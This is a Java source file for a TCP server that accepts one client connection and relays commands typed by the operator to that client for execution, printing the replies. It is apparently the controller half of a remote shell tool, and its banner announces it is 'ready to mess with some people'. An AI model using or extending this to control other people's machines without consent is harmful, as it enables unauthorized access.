import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;


public class Server {
    public static void main(String[] args) {
        int port = 12345;
        String command;

        try(ServerSocket serverSocket = new ServerSocket(port)){
            System.out.println("Server is listening on port " + port);
            System.out.println("Ready to mess with some people!\n\n"+
                                "************* Author: Adam M. Hache *************\n"+
                                "***************** Made in : 2025 *****************\n"+
                                "****************** Version: 1.0 ******************\n"+
                                "************** Type 'exit' to quit **************\n");

            try (Socket clientSocket = serverSocket.accept()) {
                System.out.println("Client connected: " + clientSocket.getInetAddress());
                
                BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
                PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);
                
                Scanner scanner = new Scanner(System.in);
                
                System.out.println("Enter a command to execute on the client: ");
                while (true) {
                    System.out.print("$ ");
                    command = scanner.nextLine();
                    
                    if(command.equalsIgnoreCase("exit")){
                        out.println("exit");
                        break;
                    }
                    
                    out.println(command);
                    
                    String output;
                    while ((output = in.readLine()) != null) {
                        if (output.equals("END")) {
                            break;
                        }
                        System.out.println(output);
                    }
                }
            }
        }catch(IOException e){
            System.out.println(e.getMessage());
        }
    }
}